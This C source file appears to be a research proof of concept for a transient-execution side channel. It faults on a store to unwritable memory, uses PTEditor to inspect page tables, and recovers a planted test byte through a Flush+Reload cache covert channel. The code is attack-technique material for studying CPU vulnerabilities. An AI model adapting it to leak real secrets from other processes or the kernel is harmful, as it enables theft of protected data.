#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#include "../../cacheutils.h"
// #include "../../ptedit_header.h"

#include "share.h"

#define SECRET 'S'

// __attribute__((aligned(4096))) uint8_t oracles[4096*256];
extern uint8_t* probe_array;
extern uint8_t* unwritable_data;
extern void gadget(uint8_t *ptr);

int main(){

    uint8_t *oracles = (uint8_t*)&probe_array;

    //access oracles to avoid page fault
    for(int i = 0; i < 256; ++i){
        oracles[i<<12] = 1; 
    }

    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    
    printf("cache threshold %ld\n", CACHE_MISS);

    if(ptedit_init()) {
        printf("Could not initialize ptedit (did you load the kernel module?)\n");
        return 1;
    }

    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGBUS, trycatch_segfault_handler);
    signal(SIGILL, trycatch_segfault_handler);
    

    char *secret_str = "this is a secret string.";

    // uint8_t*ptr = (uint8_t *)&data_RW;
    // //access ptr to avoid page fault
    // ptr[0] = ptr[0] + 1 - 1;
    uint8_t* ptr = (uint8_t *)&unwritable_data;


    //print pte
    ptedit_entry_t pte = ptedit_resolve(ptr, 0);
    ptedit_print_entry(pte.pte);

    //setup pages
    setup_pages();
    puts("Pages setup finished.");

    pte = ptedit_resolve(ptr, 0);
    ptedit_print_entry(pte.pte);



    //flush probe array
    for(int i = 0; i < 256; ++i){
        flush((void *)&oracles[i<<12]);
    }


   

    int cnt = 1000;
    while(cnt --){
        // printf("cycles: %d\n", 10000 - cnt);
        if(!setjmp(trycatch_buf))
        {
            // maccess(0);
            // gadget(ptr + 32);
            (*((volatile char*)((size_t)ptr + 32))) = SECRET;
            maccess(oracles + (*((volatile char*)((size_t)ptr + 32))) * 4096);
        }

        //Recover data from cache covert channel
        for(int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) % 256;
        if(flush_reload(oracles + mix_i * 4096)) {
            printf("%c ", mix_i);
            fflush(stdout);
        }
        }
            
    }


    ptedit_cleanup();
    return 0;
}